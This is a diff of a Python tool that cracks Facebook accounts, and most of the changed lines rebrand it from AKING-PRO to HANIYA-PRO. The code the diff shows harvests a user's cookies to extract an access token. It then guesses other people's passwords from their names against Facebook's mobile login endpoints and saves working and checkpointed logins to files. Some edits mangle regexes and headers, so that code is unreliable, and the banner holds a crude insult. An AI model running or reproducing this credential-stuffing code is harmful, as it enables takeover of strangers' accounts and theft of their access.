@@ -51,18 +51,18 @@ logo=("""\033[1;37m
  d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
  88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
  88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
- 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
+ 88   88 88 `88.   .88.   88  V888 88. 8  \033[1;35m𝐎 \033[1;37m
  YP   YP YP   YD Y888888P VP   V8P  Y888P   
 ----------------------------------------------
- Author    : IMTIAZ LKING
- Github    : AKING110
- Facebook  : MR.AKING.GANDO
- Tool Name : AKING-PRO
+ Author    : HANIYA BALOCH
+ Github    : Haniyabaloch0786
+ Facebook  : Beauty queen
+ Tool Name : HANIYA-PRO
  Type type : PAID
  Version   : 1.9.8
 ----------------------------------------------
- AKING Pro version 1.9.8
- For Haters: Tumhare Okat Nhi Mere BAAJI chodne Ke 🤞
+ HANIYA Pro version 1.9.8
+ For Haters: Tumhare Okat Nhi Mujhse Milne Ki 🤞
 \033[1;37m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
@@ -79,7 +79,7 @@ def login():
         clear()
         cookies = input(' Put cookies: ')
         try:
-                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start];q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                 find_token = re.search("(EAAG\w+)", data.text)
                 open(".tok.txt", "w").write(find_token.group(1))
                 open(".coki.txt","w").write(cookies)
@@ -462,9 +462,9 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start];q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        idpass ={"lsd":re.search('name="lsd" value="(.?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Aking=session.cookies.get_dict().keys()
                         if "c_user" in Aking:
@@ -611,18 +611,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [HANIYA-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/HANIYA-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [HANIYA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HANIYA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/AKING-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/HANIYA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -634,7 +634,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [HANIYA-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -680,16 +680,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/AKING-OK.txt','r').read()
+                                                okk=open('/sdcard/HANIYA-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [HANIYA-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/HANIYA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [HANIYA-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HANIYA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
